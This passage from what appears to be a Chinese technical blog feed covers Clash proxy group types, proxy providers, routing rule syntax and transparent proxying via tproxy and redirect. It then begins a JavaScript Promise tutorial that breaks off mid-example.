class="attr">name:</span> <span class="string">&quot;US-JP Relay&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">relay</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;US-Proxy&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;JP-Proxy&quot;</span></span><br></pre></td></tr></table></figure><p>适用于当用户需要将流量通过特定的国家或地区进行中继时。比如用户想要访问仅限日本的内容，但同时想要通过美国的代理增加匿名性。</p><h3 id="URL-Test-延迟测试"><a href="#URL-Test-延迟测试" class="headerlink" title="URL-Test 延迟测试"></a>URL-Test 延迟测试</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Url-Test:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;Fastest-Proxy&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-A&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-B&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;http://www.gstatic.com/generate_204&quot;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">600</span></span><br></pre></td></tr></table></figure><p>自动选择延迟最低的代理服务器。比如用户在进行在线游戏或视频会议时，需要确保连接是最快的。</p><h3 id="Fallback-可用性测试"><a href="#Fallback-可用性测试" class="headerlink" title="Fallback 可用性测试"></a>Fallback 可用性测试</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Fallback:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;Available-Proxy&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">fallback</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-A&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-B&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;http://www.gstatic.com/generate_204&quot;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">600</span></span><br></pre></td></tr></table></figure><p>确保总是有一个可用的代理服务器。比如用户在进行重要的网络操作，如在线交易，需要确保不会因为代理服务器的问题而中断。</p><h3 id="Load-Balance-负载均衡"><a href="#Load-Balance-负载均衡" class="headerlink" title="Load-Balance 负载均衡"></a>Load-Balance 负载均衡</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Load-Balance:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;Balance-Group&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">load-balance</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-A&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-B&quot;</span></span><br><span class="line">    <span class="attr">sticky-session:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>当用户想要在多个代理服务器之间分配负载时。比如用户在下载大文件或进行多线程下载时，可以平均分配流量以优化速度。</p><h3 id="Select-手动选择"><a href="#Select-手动选择" class="headerlink" title="Select 手动选择"></a>Select 手动选择</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Select:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;Manual-Select&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-A&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;Proxy-B&quot;</span></span><br><span class="line">    <span class="attr">interface-name:</span> <span class="string">&quot;en0&quot;</span></span><br></pre></td></tr></table></figure><p>最常用，平常在 Clash 里点点点切换代理服务器的时候基本都是在用 Select 策略组。</p><p>适用于用户想要完全控制选择哪个代理服务器。比如用户根据不同的网络活动（如流媒体、游戏或工作）手动切换代理服务器。</p><h3 id="DIRECT-直连出站"><a href="#DIRECT-直连出站" class="headerlink" title="DIRECT 直连出站"></a>DIRECT 直连出站</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Direct:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;Direct-Connection&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">direct</span></span><br><span class="line">    <span class="attr">interface-name:</span> <span class="string">&quot;en0&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Outbound-出站-Proxy-Providers"><a href="#Outbound-出站-Proxy-Providers" class="headerlink" title="Outbound 出站 Proxy Providers"></a>Outbound 出站 Proxy Providers</h2><p>前面介绍了 Clash 出站时的 Proxy 和 Proxy Groups，单独的机场订阅链接这两个就够用了。一般情况下是配置文件中配置一串 Proxy，然后 Proxy Groups 中配置一个 Select 策略供用户自行选择，额外再配置几个 url-test 用于实现自动选择和流量监测。</p><p>但如果我们有多个机场链接，现在想编写一个统一的配置文件，流畅地在多个订阅之间切换代理服务器，应该怎么做？刚开始的想法可能是 cv 硬编码进去，但这种实现方案比较臃肿。幸好，Clash Premium Core 已经支持了 <strong>Proxy Providers</strong>，实现提供在线规则集，可以通过托管链接获取节点信息，避免了硬编码。</p><p>一个可供参考的使用示范如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.yaml</span></span><br><span class="line"><span class="attr">proxy-providers:</span></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">file</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/test.yaml</span></span><br><span class="line">    <span class="attr">health-check:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="number">36000</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.yaml</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;ss1&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">ss</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="attr">cipher:</span> <span class="string">chacha20-ietf-poly1305</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">&quot;password&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;ss2&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">ss</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="attr">cipher:</span> <span class="string">chacha20-ietf-poly1305</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">&quot;password&quot;</span></span><br><span class="line">    <span class="attr">plugin:</span> <span class="string">obfs</span></span><br><span class="line">    <span class="attr">plugin-opts:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">tls</span></span><br></pre></td></tr></table></figure><p><a href="https://www.10101.io/2020/02/12/use-clash-proxy-provider-with-subconverter">Clash proxy-provider 搭配 subconverter 使用小记 - 方寸间</a></p><h2 id="Rules-规则"><a href="#Rules-规则" class="headerlink" title="Rules 规则"></a>Rules 规则</h2><p>规则是 Clash 的精华部分，也是一份配置文档中最为冗长的部分。打开你现在使用的订阅链接配置文件，几千行的配置信息中，可能只有前几十行是出入站配置，剩下的所有都是 rules 规则。</p><p>一条规则的基本格式如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 类型,参数,策略(,no-resolve)</span></span><br><span class="line"><span class="string">TYPE,ARGUMENT,POLICY(,no-resolve)</span></span><br></pre></td></tr></table></figure><p>其中 <code>no-resolve</code> 选项是可选的, 它用于跳过规则的 DNS 解析。当你想要使用 <code>GEOIP</code>、<code>IP-CIDR</code>、<code>IP-CIDR6</code>、<code>SCRIPT</code> 规则，但又不想立即将域名解析为 IP 地址时，这个选项就很有用了。<br>Clash 可用的规则类型其实不多，感觉自己也讲不出什么新点，但不写在着文章里感觉又不完整，索性 cv 了<a href="https://clash.wiki/configuration/rules.html#%E8%A7%84%E5%88%99%E7%B1%BB%E5%9E%8B">这份文档</a>，就稍微改了下格式，推荐去原文档看。</p><h3 id="DOMAIN-域名"><a href="#DOMAIN-域名" class="headerlink" title="DOMAIN 域名"></a>DOMAIN 域名</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">DOMAIN,www.google.com,policy</span></span><br></pre></td></tr></table></figure><p>将 <code>www.google.com</code> 路由到 <code>policy</code>。</p><h3 id="DOMAIN-SUFFIX-域名后缀"><a href="#DOMAIN-SUFFIX-域名后缀" class="headerlink" title="DOMAIN-SUFFIX 域名后缀"></a>DOMAIN-SUFFIX 域名后缀</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">DOMAIN-SUFFIX,youtube.com,policy</span></span><br></pre></td></tr></table></figure><p>将任何以 <code>youtube.com</code> 结尾的域名路由到 <code>policy</code>。在这种情况下，<code>www.youtube.com</code> 和 <code>foo.bar.youtube.com</code> 都将路由到 <code>policy</code>。</p><h3 id="DOMAIN-KEYWORD-域名关键字"><a href="#DOMAIN-KEYWORD-域名关键字" class="headerlink" title="DOMAIN-KEYWORD 域名关键字"></a>DOMAIN-KEYWORD 域名关键字</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">DOMAIN-KEYWORD,google,policy</span></span><br></pre></td></tr></table></figure><p>将任何包含 <code>google</code> 关键字的域名路由到 <code>policy</code>。在这种情况下，<code>www.google.com</code> 或 <code>googleapis.com</code> 都将路由到 <code>policy</code>。</p><h3 id="GEOIP-IP地理位置-国家代码"><a href="#GEOIP-IP地理位置-国家代码" class="headerlink" title="GEOIP IP地理位置 (国家代码)"></a>GEOIP IP地理位置 (国家代码)</h3><p>GEOIP 规则用于根据数据包的目标 IP 地址的<strong>国家代码</strong>路由数据包，Clash 使用 <a href="https://dev.maxmind.com/geoip/geoip2/geolite2/"><strong>MaxMind GeoLite2</strong></a> 数据库来实现这一功能。使用这种规则时，Clash 将域名解析为 IP 地址，然后查找 IP 地址的国家代码。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GEOIP,CN,policy</span></span><br></pre></td></tr></table></figure><p>将任何目标 IP 地址为中国的数据包路由到 <code>policy</code>。</p><h3 id="IP-CIDR-IPv4地址段"><a href="#IP-CIDR-IPv4地址段" class="headerlink" title="IP-CIDR IPv4地址段"></a>IP-CIDR IPv4地址段</h3><p>IP-CIDR 规则用于根据数据包的<strong>目标 IPv4 地址</strong>路由数据包。使用这种规则时, Clash 将域名解析为 IPv4 地址。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">IP-CIDR,127.0.0.0/8,DIRECT</span></span><br></pre></td></tr></table></figure><p>将任何目标 IP 地址为 <code>127.0.0.0/8</code> 的数据包路由到 <code>DIRECT</code>。</p><h3 id="IP-CIDR6-IPv6地址段"><a href="#IP-CIDR6-IPv6地址段" class="headerlink" title="IP-CIDR6 IPv6地址段"></a>IP-CIDR6 IPv6地址段</h3><p>IP-CIDR6 规则用于根据数据包的<strong>目标 IPv6 地址</strong>路由数据包。使用这种规则时, Clash 将域名解析为 IPv6 地址。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">IP-CIDR6,2620:0:2d0:200::7/32,policy</span></span><br></pre></td></tr></table></figure><p>将任何目标 IP 地址为 <code>2620:0:2d0:200::7/32</code> 的数据包路由到 <code>policy</code>。</p><h3 id="SRC-IP-CIDR-源IP段地址"><a href="#SRC-IP-CIDR-源IP段地址" class="headerlink" title="SRC-IP-CIDR 源IP段地址"></a>SRC-IP-CIDR 源IP段地址</h3><p>SRC-IP-CIDR 规则用于根据数据包的<strong>源 IPv4 地址</strong>路由数据包。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">SRC-IP-CIDR,192.168.1.201/32,DIRECT</span></span><br></pre></td></tr></table></figure><p>将任何源 IP 地址为 <code>192.168.1.201/32</code> 的数据包路由到 <code>DIRECT</code>。</p><h3 id="SRC-PORT-源端口"><a href="#SRC-PORT-源端口" class="headerlink" title="SRC-PORT 源端口"></a>SRC-PORT 源端口</h3><p>SRC-PORT 规则用于根据数据包的<strong>源端口</strong>路由数据包。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">SRC-PORT,80,policy</span></span><br></pre></td></tr></table></figure><p>将任何源端口为 <code>80</code> 的数据包路由到 <code>policy</code>。</p><h3 id="DST-PORT-目标端口"><a href="#DST-PORT-目标端口" class="headerlink" title="DST-PORT 目标端口"></a>DST-PORT 目标端口</h3><p>DST-PORT 规则用于根据数据包的<strong>目标端口</strong>路由数据包。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">DST-PORT,80,policy</span></span><br></pre></td></tr></table></figure><p>将任何目标端口为 <code>80</code> 的数据包路由到 <code>policy</code>。</p><h3 id="PROCESS-NAME-源进程名"><a href="#PROCESS-NAME-源进程名" class="headerlink" title="PROCESS-NAME 源进程名"></a>PROCESS-NAME 源进程名</h3><p>PROCESS-NAME 规则用于根据发送数据包的进程名称路由数据包。目前仅支持 macOS、Linux、FreeBSD 和 Windows。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PROCESS-NAME,nc,DIRECT</span></span><br></pre></td></tr></table></figure><p>将任何来自进程 <code>nc</code> 的数据包路由到 <code>DIRECT</code>。</p><h3 id="PROCESS-PATH-源进程路径"><a href="#PROCESS-PATH-源进程路径" class="headerlink" title="PROCESS-PATH 源进程路径"></a>PROCESS-PATH 源进程路径</h3><p>PROCESS-PATH 规则用于根据发送数据包的进程路径路由数据包。目前仅支持 macOS、Linux、FreeBSD 和 Windows。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PROCESS-PATH,/usr/local/bin/nc,DIRECT</span></span><br></pre></td></tr></table></figure><p>将任何来自路径为 <code>/usr/local/bin/nc</code> 的进程的数据包路由到 <code>DIRECT</code>。</p><h3 id="IPSET-IP集"><a href="#IPSET-IP集" class="headerlink" title="IPSET IP集"></a>IPSET IP集</h3><p>IPSET 规则用于根据 IP 集匹配并路由数据包. 根据 <a href="https://ipset.netfilter.org/"><strong>IPSET 的官方网站</strong></a> 的介绍:</p><blockquote><p>IP 集是 Linux 内核中的一个框架, 可以通过 ipset 程序进行管理。根据类型，IP 集可以存储 IP 地址、网络、 (TCP&#x2F;UDP) 端口号、MAC 地址、接口名称或它们以某种方式的组合，以确保在集合中匹配条目时具有闪电般的速度。</p></blockquote><p>因此, 此功能仅在 Linux 上工作, 并且需要安装 <code>ipset</code>。使用此规则时, Clash 将解析域名以获取 IP 地址, 然后查找 IP 地址是否在 IP 集中. 如果要跳过 DNS 解析, 请使用 <strong><code>no-resolve</code></strong> 选项.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">IPSET,chnroute,policy</span></span><br></pre></td></tr></table></figure><p>将任何目标 IP 地址在 IP 集 <code>chnroute</code> 中的数据包路由到 <code>policy</code>.</p><h3 id="RULE-SET-规则集"><a href="#RULE-SET-规则集" class="headerlink" title="RULE-SET 规则集"></a>RULE-SET 规则集</h3><p>此功能仅在 <a href="https://clash.wiki/premium/introduction.html"><strong>Premium 版本</strong></a> 中可用。</p><p>RULE-SET 规则用于根据 <a href="https://clash.wiki/premium/rule-providers.html"><strong>Rule Providers 规则集</strong></a> 的结果路由数据包。当 Clash 使用此规则时，它会从指定的 Rule Providers 规则集中加载规则，然后将数据包与规则进行匹配。 如果数据包与任何规则匹配，则将数据包路由到指定的策略, 否则跳过此规则。</p><p>使用 RULE-SET 时，当规则集的类型为 IPCIDR ，Clash 将解析域名以获取 IP 地址。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">RULE-SET,my-rule-provider,DIRECT</span></span><br></pre></td></tr></table></figure><p>从 <code>my-rule-provider</code> 加载所有规则。</p><h3 id="SCRIPT-脚本"><a href="#SCRIPT-脚本" class="headerlink" title="SCRIPT 脚本"></a>SCRIPT 脚本</h3><p>此功能仅在 <a href="https://clash.wiki/premium/introduction.html"><strong>Premium 版本</strong></a> 中可用。</p><p>SCRIPT 规则用于根据脚本的结果路由数据包。当 Clash 使用此规则时，它会执行指定的脚本，然后将数据包路由到脚本的输出。使用 SCRIPT 时，Clash 将解析域名以获取 IP 地址。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">SCRIPT,script-path,DIRECT</span></span><br></pre></td></tr></table></figure><p>将数据包路由到脚本 <code>script-path</code> 的输出.</p><h3 id="MATCH-全匹配"><a href="#MATCH-全匹配" class="headerlink" title="MATCH 全匹配"></a>MATCH 全匹配</h3><p>MATCH 规则用于路由剩余的数据包。该规则是<strong>必需</strong>的，通常用作最后一条规则。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">MATCH,policy</span></span><br></pre></td></tr></table></figure><p>将剩余的数据包路由到 <code>policy</code>。</p><h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><h3 id="tproxy"><a href="#tproxy" class="headerlink" title="tproxy"></a>tproxy</h3><p>参考：<a href="https://www.zhaohuabing.com/learning-linux/docs/tproxy/">tproxy（透明代理）</a></p><p>tproxy 即 transparent（透明） proxy。这里的 transparent（透明）有两层含义：</p><ol><li>代理对于 client 是透明的，client 端无需进行任何配置。即无需修改请求地址，也无需采用代理协议和代理服务器进行协商。与之相对比的是 socks 代理或者 http 代理，需要在 client 端设置代理的地址，在发起请求时也需要通过代理协议告知代理服务器其需要访问的真实地址。</li><li>代理对于 server 是透明的，server 端看到的是 client 端的地址，而不是 proxy 的地址</li></ol><p>这么说可能不够直观，通过下面这张图看会比较好，后者为透明代理，可以清晰地看到 client 发出请求的目的 IP 就是目标服务器的 IP：</p><p><img src="https://img.ma5hr00m.top/blog/20240613024955.png" alt="20240613024955"></p><p>从上面的描述能看出来，因为透明代理是在网络层面实现的，实现了全局代理的效果，所以无需在每个应用程序中配置，简化了操作，也在一定程度上增强了代理的隐蔽性。</p><p>但由于客户端请求数据包的目的地址不是代理服务器，因此需要通过路由和 iptables 规则（Clash 实现，无需用户手动操作）将客户端的请求发送给代理服务器处理。</p><h3 id="redirect"><a href="#redirect" class="headerlink" title="redirect"></a>redirect</h3><p>redirect 是另一种实现透明代理的方式。redirect 透明代理主要用于 TCP 流量，是通过修改数据包的目的端口来实现的。这种方法不需要像 tproxy 那样在网络层面进行操作，而是在传输层上实现的。</p><p>以下是 Clash 基于 redirect 实现透明代理的过程：</p><ol><li>当客户端发起一个 TCP 连接时，iptables 规会捕获到这个连接请求；</li><li>根据设置的规则，iptables 会将这个连接的目的端口重定向到 Clash 监听的端口上；</li><li>Clash 接收到这个连接后，根据内部的规则处理，然后将流量转发到真正的目标服务器。</li></ol><p>使用 redirect 的优点是配置相对简单，特别是在不支持 tproxy 的系统上。它可以直接在 iptables 中设置，无需对操作系统的网络栈进行复杂的配置。这使得 redirect 成为一个在简单场景下快速部署透明代理的好选择。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> Clash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise使用一览</title>
      <link href="/2024/06/17/2024/promise/"/>
      <url>/2024/06/17/2024/promise/</url>
      
        <content type="html"><![CDATA[<p>Promise 规范最早由 CommonJS 社区提出，后来成为 ES2015（ES6） 语言规范，到现在可以说已经成了异步编程的首选方案。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Using_promises">使用 Promise - JavaScript | MDN</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023024413276544">Promise</a></p><h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><ul><li><code>Penfing</code>  等待</li><li><code>Fulfilled</code> 成功</li><li><code>rejected</code> 失败</li></ul><h3 id="构造函数-Promise-excutor"><a href="#构造函数-Promise-excutor" class="headerlink" title="构造函数 Promise(excutor)"></a>构造函数 Promise(excutor)</h3><p><code>Promise</code> 构造函数是 JavaScript 中用于处理异步操作的一个重要工具。</p><ul><li><strong>构造函数 <code>Promise(executor)</code></strong>：<ul><li><code>Promise</code> 构造函数接受一个名为 <code>executor</code> 的回调函数作为参数。当你创建一个 <code>Promise</code> 实例时，这个 <code>executor</code> 函数会被立即执行。</li><li><code>executor</code> 函数接收两个参数：<code>resolve</code> 和 <code>reject</code>。这两个参数也是函数，你可以在 <code>executor</code> 函数内部调用它们来改变 <code>Promise</code> 的状态。</li></ul></li><li><strong>状态变更</strong>：<ul><li>当 <code>resolve</code> 被调用时，它会将 <code>Promise</code> 的状态从 “pending”（等待）变更为 “fulfilled”（已完成）。</li><li>当 <code>reject</code> 被调用时，它会将 <code>Promise</code> 的状态从 “pending”（等待）变更为 “rejected”（已失败）。</li><li>如果 <code>executor</code> 函数中抛出了一个错误，那么 <code>Promise</code> 会自动变更为 “rejected” 状态，并且错误对象会被作为 <code>reject</code> 函数的参数传递出去。</li></ul></li><li><strong>返回新的 <code>Promise</code></strong>：<ul><li>在 <code>executor</code> 函数中，你可以通过 <code>resolve</code> 返回一个值，或者通过 <code>reject</code> 返回一个错误。</li><li>如果你在 <code>resolve</code> 中传递了另一个 <code>Promise</code>（比如 <code>Promise.reject(&quot;err&quot;)</code>），那么当前 <code>Promise</code> 的状态将会跟随传递进来的 <code>Promise</code> 的状态。</li></ul></li></ul><p>这是一个简单的例子来说明这个概念：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 异步操作</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="title function_">fetchData</span>(); <span class="comment">// 假设这是一个获取数据的函数</span></span><br><span class="line">    <span class="keyword">if</span> (data) &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(data); <span class="comment">// 如果数据获取成功，使用resolve改变Promise状态为fulfilled</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">reject</span>(<span class="string">&#x27;数据获取失败&#x27;</span>); <span class="comment">// 如果数据获取失败，使用reject改变Promise状态为rejected</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// 如果Promise状态为fulfilled，这里将输出获取到的数据</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error); <span class="comment">// 如果Promise状态为rejected，这里将输出错误信息</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>promise</code> 是一个新创建的 <code>Promise</code> 对象。我们传递了一个 <code>executor</code> 函数给 <code>Promise</code> 构造函数，这个函数内部执行了一个异步操作（<code>setTimeout</code>）。当异步操作完成后，我们根据结果调用 <code>resolve</code> 或 <code>reject</code> 来改变 <code>Promise</code> 的状态。然后我们可以使用 <code>.then()</code> 和 <code>.catch()</code> 方法来处理 <code>Promise</code> 成功或失败的结果。</p><h2 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h2><h3 id="then-onFulfilled-onRejected"><a href="#then-onFulfilled-onRejected" class="headerlink" title="then(onFulfilled, onRejected)"></a>then(onFulfilled, onRejected)</h3><p><img src="https://img.ma5hr00m.top/blog/20240609140952.png" alt="20240609140952"></p><p><code>then(onFulfilled, onRejected)</code> 方法是 <code>Promise</code> 对象的一个非常重要的特性，它允许你为 <code>Promise</code> 注册 <code>onFulfilled</code> 和 <code>onRejected</code> 回调函数。</p><ul><li><strong>作用</strong>：<ul><li>为 <code>Promise</code> 注册 <code>onFulfilled</code> 和 <code>onRejected</code> 回调函数，这些函数分别在 <code>Promise</code> 成功（fulfilled）或失败（rejected）时被调用。</li><li>返回一个新的 <code>Promise</code> 对象，使得可以实现链式调用。这意味着你可以在一个 <code>then</code> 调用后继续添加更多的 <code>then</code> 或 <code>catch</code> 方法。</li></ul></li><li><strong>特性</strong>：<ul><li><code>then</code> 方法会自动返回一个新的 <code>Promise</code> 对象。这个新的 <code>Promise</code> 对象的状态（fulfilled 或 rejected）将由 <code>onFulfilled</code> 或 <code>onRejected</code> 回调函数的返回值决定。</li><li>如果 <code>onFulfilled</code> 或 <code>onRejected</code> 回调函数返回一个值，那么新的 <code>Promise</code> 将以这个值为结果被解决（resolve）。</li><li>如果回调函数返回另一个 <code>Promise</code>，那么新的 <code>Promise</code> 将“跟随”这个 <code>Promise</code> 的状态，即如果返回的 <code>Promise</code> 被解决，新的 <code>Promise</code> 也会被解决；如果返回的 <code>Promise</code> 被拒绝，新的 <code>Promise</code> 也会被拒绝。</li></ul></li></ul><p>这种机制允许你创建复杂的异步代码序列，其中一个操作的完成可以链接到下一个操作，而不需要嵌套回调函数。这样做可以提高代码的可读性和可维护性。</p><p>例如，你可以这样使用 <code>then</code> 方法：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">doSomething</span>()</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">result</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">doSomethingElse</span>(result);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title 